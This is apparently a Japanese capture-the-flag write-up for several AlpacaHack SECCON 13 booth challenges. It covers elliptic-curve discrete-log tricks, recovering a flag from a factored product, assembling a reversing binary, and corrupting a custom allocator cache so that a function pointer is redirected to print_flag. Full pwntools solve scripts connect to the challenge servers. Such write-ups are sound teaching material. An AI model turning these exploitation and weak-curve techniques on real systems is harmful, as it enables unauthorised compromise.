<https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges> のうち面白かった問題、<https://github.com/minaminao/my-ctf-challenges/tree/main/ctfs/alpacahack-seccon-13-finals-booth> でカバーされていない解法などを書く。

## [Crypto] Customizable EC
主に 3 種類の解法がある。
1. $p = 2^{521}-1$ として位数が $p+1 = 2^{521}$ の曲線を使う
    - <https://github.com/minaminao/my-ctf-challenges/tree/main/ctfs/alpacahack-seccon-13-finals-booth>
    - こうした曲線は超特異曲線 (supersingular curve) と呼ばれる
2. Anomalous curve を構成して使う
    - <https://hackmd.io/@FurgjSzLSjeQo0q8zgTaqQ/HJT3Raboyx#Customizable-EC>
3. 小さい位数を持つ曲線をランダムに生成して、中国剰余定理を使う
    - Invalid curve attack に近い
 
### 解法 1
<https://github.com/minaminao/my-ctf-challenges/tree/main/ctfs/alpacahack-seccon-13-finals-booth> の解法。
この解法を使うときは、楕円曲線が巡回群であるか、巡回群の積に分解したとき十分に位数が大きい群を含むことを確認すること。そうしないと思わぬ罠にハマる。

今回の場合、 $y^2 \equiv x^3+ax \pmod{p}$ は…
- $a = 1$ のとき $\mathbb{Z}/2^{521}\mathbb{Z}$ と同型
- $a = 3$ のとき $\mathbb{Z}/2^{520}\mathbb{Z} \oplus \mathbb{Z}/2\mathbb{Z}$ と同型

なので、どちらの場合でも特に問題ない。

::: details sage の実行結果
```python
sage: EllipticCurve(GF(2**521-1), [1, 0]).abelian_group()
Additive abelian group isomorphic to Z/6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057152 embedded in Abelian group of points on Elliptic Curve defined by y^2 = x^3 + x over Finite Field of size 6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151
sage: EllipticCurve(GF(2**521-1), [3, 0]).abelian_group()
Additive abelian group isomorphic to Z/3432398830065304857490950399540696608634717650071652704697231729592771591698828026061279820330727277488648155695740429018560993999858321906287014145557528576 + Z/2 embedded in Abelian group of points on Elliptic Curve defined by y^2 = x^3 + 3*x over Finite Field of size 6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151
```
:::

### 解法 2
<https://hackmd.io/@FurgjSzLSjeQo0q8zgTaqQ/HJT3Raboyx#Customizable-EC> の解法。特に理由がなければ極力これを採用すべきである。
- Anomalous curve を使えば一発で離散対数が求められる
  - 解法 1 のやり方は素数の bit 数に制限があると使えない可能性がある
 
### 解法 3
ランダムに曲線を生成して小さい位数の点を持つのを待つ。

- $p = 9973^{40}$ とする。server.sage で素数判定がされていないことを利用する。
  - $p$ を 512 bit 程度の素数にしてしまうと楕円曲線の位数の計算が重い。素数ベキにすると軽い。
    - 軽いのは $\mathrm{GF}(9973)$ で計算した位数を $\mathrm{GF}(9973^{40})$ での位数計算に使うことができるため。
- 位数を $2^{20}$ までの整数で試し割りする。
  - 完全な素因数分解は重く、またあまりに大きすぎる素因数は Pohlig-Hellman で離散対数問題を解くときに役に立たない。

::: details solve.sage
```python
# https://stackoverflow.com/questions/65579133/every-time-i-run-my-script-it-returns-curses-error-must-call-setupterm-firs
import os
os.environ['TERM'] = 'linux'
os.environ['PWNLIB_NOTERM'] = '1'


import sys
import time
import secrets
from functools import reduce
from operator import mul
from pwn import remote, process, context
from Crypto.Util.number import long_to_bytes, bytes_to_long, isPrime


local = len(sys.argv) == 1
context.log_level = 'error'
p = 9973**40


def find_clue_one(mo: int, start: float) -> tuple[int, int]:
    print(f'# ({time.time() - start:.2f}s) {mo.bit_length() = }')
    a = secrets.randbelow(p)
    b = secrets.randbelow(p)
    E = EllipticCurve(GF(p), [a, b])
    o = E.order()
    small_factors_raw = o.factor(limit=2**20)
    small_factors = [p for p, _ in list(small_factors_raw) if isPrime(p)]
    prod = reduce(mul, [1] + small_factors)
    if mo % prod == 0:
        return 0, 1 # No additional clue
    print(f'# ({time.time() - start:.2f}s) {prod = }')
    io = process(['sage', 'server.sage'], env={'HOME': os.getenv('HOME'), 'FLAG': 'TestCTF{test_test_test}'}) if local else remote(sys.argv[1], int(sys.argv[2]))
    io.recvuntil(b'Enter p,a,b: ')
    io.sendline(f'{p},{a},{b}'.encode())
    io.recvuntil('P=')
    pdat = io.recvuntil(', Q=')
    pdat = pdat.removesuffix(b', Q=')
    qdat = io.recvline().strip()
    P = E(*pdat[1:-1].decode().split(':'))
    Q = E(*qdat[1:-1].decode().split(':'))
    io.close()
    P = P * (o // prod)
    Q = Q * (o // prod)
    print(f'# ({time.time() - start:.2f}s) {P * prod = }')
    P.set_order(multiple=prod)
    o = P.order()
    print(f'# ({time.time() - start:.2f}s) {o = }')
    l = Q.log(P)
    g = gcd(mo, o)
    print(f'# ({time.time() - start:.2f}s) {l = }')
    return l % (o // g), o // g


if __name__ == '__main__':
    start = time.time()
    rem, mo = 0, 1
    while mo.bit_length() <= 512:
        a, b = find_clue_one(mo, start)
        rem = rem * pow(b, -1, mo) * b + a * pow(mo, -1, b) * mo
        mo *= b
        rem %= mo
    print(long_to_bytes(rem).decode())
```
:::

## [Crypto] 42*
### 問題
<https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/42-star>
### 解法
<https://github.com/minaminao/my-ctf-challenges/tree/main/ctfs/alpacahack-seccon-13-finals-booth> とほとんど同じだが、フラグの長さの見積もりをもう少し正確にできる。

c は 1912 bit であり、getrandbits(42) は 42 bit 以下の一様乱数を返すので、getrandbits(42)/(2**42) が [0,1] の一様乱数とみなせるため、これらの積の分布を求めることができる。
フラグの長さは [180.7, 236.5] bit と予測できる。

::: details solve.py
```python
"""
43 bit 以上の素因数は確実に元のフラグ由来である。
その倍数であって 'Alpaca{' で始まり、すべての文字が [0x20, 0x7e] に含まれるものを探す。
getrandbits(42) の 42 個の積はおよそ 1700 bit で c は 1912 bit なので、残りの 212 bit 程度が FLAG である。
証明:
  X = getrandbits(42)/(2**42) を [0,1] の一様乱数とみなし、 ln X の期待値と分散を求める。
    E[ln X] = ∫[0,1] ln x dx = [x ln x - x]_0^1 = -1
    E[ln^2 X] = ∫[0,1] (ln x)^2 dx = [x (ln x)^2 - 2 x ln x + 2 x]_0^1 = 2
    Var[ln X] = E[ln^2 X] - E[ln X]^2 = 2 - 1 = 1
  よって、ln X 42 個の和は N(-42, 42) に近似できる分布に従う。
  log_2 X 42 個の和は平均 -42 / ln 2 ~= -60.6, 標準偏差 sqrt(42) / ln 2 ~= 9.3 である。
  99% 信頼区間は [-60.6 - 3 * 9.3, -60.6 + 3 * 9.3] = [-88.5, -32.7] である。
  2**42 42 個の積は 1764 bit なので、もとの積の 99% 信頼区間は [1675.5, 1731.3] である。
  FLAG の範囲としては [1912 - 1731.3, 1912 - 1675.5] = [180.7, 236.5] を見ればよい。
"""
import sys
from functools import reduce
from operator import mul
from Crypto.Util.number import long_to_bytes, bytes_to_long

c = 302825260919317779466638288706941757478119936504864503289299111810878557424069832851837952929397907929396668240458993245662741522591539210493306557224673507192171095532552008396687356525313836501117714017702880902013061423179550493813470620956236263763510927657899587551000326509836294794948423351121777067521675908878203343378571238778872260377769563951765315203164771192344115744888944635103673374760547507150197387248980588584664707496184797486345139870127142403853041203948936595396757260050089360185668376949219377211437731767603055237909466371770346897408000000000000000

factors = [
 (2, 45),
 (3, 19),
 (5, 15),
 (7, 4),
 (11, 4),
 (13, 3),
 (19, 3),
 (29, 2),
 (31, 2),
 (37, 3),
 (41, 2),
 (59, 1),
 (73, 1),
 (89, 1),
 (101, 1),
 (113, 1),
 (127, 1),
 (139, 1),
 (167, 1),
 (181, 1),
 (251, 1),
 (313, 1),
 (353, 1),
 (397, 1),
 (421, 1),
 (461, 1),
 (479, 1),
 (521, 1),
 (877, 1),
 (881, 1),
 (1039, 1),
 (1301, 1),
 (1319, 1),
 (2503, 1),
 (4253, 1),
 (4931, 1),
 (5153, 1),
 (5393, 1),
 (6047, 1),
 (7577, 1),
 (11939, 1),
 (13591, 1),
 (14281, 1),
 (15061, 1),
 (16063, 1),
 (17107, 1),
 (34589, 1),
 (79139, 1),
 (136247, 1),
 (542687, 1),
 (699151, 1),
 (5232047, 1),
 (6826271, 1),
 (7940341, 1),
 (8128741, 1),
 (13613293, 1),
 (15013367, 1),
 (16218857, 1),
 (26849519, 1),
 (34568459, 1),
 (44246567, 1),
 (44924899, 1),
 (131319997, 1),
 (159166789, 1),
 (193282213, 1),
 (270757631, 1),
 (441225131, 1),
 (748234759, 1),
 (2820984713, 1),
 (3453026453, 1),
 (3959747513, 1),
 (4019043439, 1),
 (5342437369, 1),
 (7711108879, 1),
 (7973344633, 1),
 (8208095579, 1),
 (9261327707, 1),
 (14178556339, 1),
 (14955780253, 1),
 (21565514297, 1),
 (25903166119, 1),
 (27943524131, 1),
 (40170254417, 1),
 (51379149413, 1),
 (260671393973, 1),
 (613612427189, 1),
 (633521692649, 1),
 (2815337843287, 1),
 (6300966946522285730659, 1),
 (176828107660926468363751, 1),
]

assert c == reduce(mul, [p ** e for p, e in factors])


if __name__ == '__main__':
    u = 6300966946522285730659 * 176828107660926468363751
    common_prefix = b'Alpaca{'
    common_prefix_int_lo = bytes_to_long(common_prefix)
    common_prefix_int_hi = bytes_to_long(common_prefix) + 1
    for l in range(184, 240, 8):
        prefix_lo = common_prefix_int_lo << (l - len(common_prefix) * 8)
        prefix_hi = common_prefix_int_hi << (l - len(common_prefix) * 8)
        q_lo = (prefix_lo + u - 1) // u
        q_hi = (prefix_hi + u - 1) // u
        print(f'# {l = }, freedom = {q_hi - q_lo}')
        for i in range(q_lo, q_hi):
            b = long_to_bytes(i * u)
            if all(0x20 <= c <= 0x7e for c in b):
                print(b.decode())
                sys.exit()
```
:::

## [Rev] Flag Printer
### 問題
<https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/flag-printer>
### 解法
配布されたコードの先頭に以下の行を追加し、コード中の `f(char*)` を `f` で置き換える。
```
.intel_syntax noprefix
.globl main
.text
```

その後、以下を実行すればよい。
```
gcc -no-pie code.S -o code.x
./code.x
```

## [Pwn] cache crasher
### 問題
<https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/cache-crasher>
### 解法
- (i) L82 で `(s[i], val) == (&funcptr, print_flag)` とすればよい。

- (ii) (i) のためには `allocate()` に入るとき `cache == &funcptr` であればよい。

- (iii) (ii) のためには `free_chunk(&funcptr)` を実行すれば良いが、そのためには `s[i] == &funcptr` が必要なので、(i) が要求されて循環する。

- (iv) (ii) のためには `allocate()` に入るとき `cache->next_chunk == &funcptr` であればよい。

色々試すと、(iv) の条件を満たすには (0, ?), (0, ?), (1, 0), (1, 0), (0, &funcptr) の順で処理をすればよいことがわかる。 (`?` は何でもよい)


::: details solve.py
```python
import sys
from pwn import remote


io = remote(sys.argv[1], int(sys.argv[2]))


def do_op(opcode: int, val: int) -> None:
    io.recvuntil(b'(0: alloc, 1: free): ')
    io.sendline(str(opcode).encode())
    if opcode == 0:
        io.recvuntil(b'data(integer): ')
        io.sendline(str(val).encode())
    else:
        io.recvuntil(b'what index to free: ')
        io.sendline(str(val).encode())
    print(io.recvuntil(b'opcode', timeout=2.0).decode())
    print()


if __name__ == '__main__':
    io.recvuntil(b'address of print_flag: ')
    print_flag = int(io.recvline().strip(), 16)
    io.recvuntil(b'address of funcptr: ')
    ref_funcptr = int(io.recvline().strip(), 16)
    print(f'# {hex(print_flag) = }, {hex(ref_funcptr) = }')
    do_op(0, 1)
    do_op(0, 2)
    do_op(1, 0)
    do_op(1, 0)
    do_op(0, ref_funcptr)
    do_op(0, 3)
    do_op(0, print_flag)
```
:::
